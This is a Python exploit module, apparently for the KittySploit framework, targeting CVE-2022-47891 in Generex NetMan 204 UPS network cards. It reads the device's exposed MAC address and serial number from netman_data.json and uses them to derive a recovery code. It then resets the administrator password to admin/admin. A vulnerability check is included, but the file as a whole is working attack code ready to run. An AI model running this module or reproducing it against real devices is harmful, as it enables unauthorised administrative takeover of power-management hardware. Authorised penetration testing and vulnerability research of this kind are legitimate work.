from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.netman204 import NetMan204


class Module(Auxiliary, Http_client, NetMan204):
    __info__ = {
        "name": "Generex NetMan 204 CVE-2022-47891 - Admin Password Reset",
        "description": (
            "Generex NetMan 204 exposes enough device information to derive the recovery code and "
            "reset the administrator password to the default value."
        ),
        "author": ["JoelGMSec", "KittySploit Team"],
        "cve": "CVE-2022-47891",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-47891",
        ],
        "tags": ["netman204", "password-reset", "recovery"],
    }

    username = OptString("admin", "NetMan 204 username to test before recovery", required=True)
    password = OptString("admin", "NetMan 204 password to test before recovery", required=True)

    def check(self):
        info = self.netman204_fetch_device_info()
        if not info:
            return {"vulnerable": False, "reason": "Unable to fetch netman_data.json", "confidence": "low"}

        if info.get("mac_address") and info.get("serial_number"):
            return {"vulnerable": True, "reason": "MAC address and serial number are exposed", "confidence": "high"}
        return {"vulnerable": False, "reason": "Required device identifiers are missing", "confidence": "low"}

    def run(self):
        auth_ctx = self.netman204_login(self.username, self.password)
        if auth_ctx:
            print_success(f"Authentication already works with {self.username}:{self.password}")
            self.netman204_logout(auth_ctx)
            return True

        info = self.netman204_fetch_device_info()
        if not info:
            print_error("Unable to fetch netman_data.json")
            return False

        mac = info.get("mac_address")
        serial = info.get("serial_number")
        if not mac or not serial:
            print_error("MAC address or serial number missing from netman_data.json")
            return False

        recovery_code = self.netman204_recovery_from_mac_serial(mac, serial)
        print_success(f"Derived recovery code: {recovery_code}")

        response = self.netman204_reset_password(recovery_code)
        if not response:
            print_error("Password reset request failed")
            return False

        print_success("Administrator password reset to the default credentials: admin / admin")
        return True
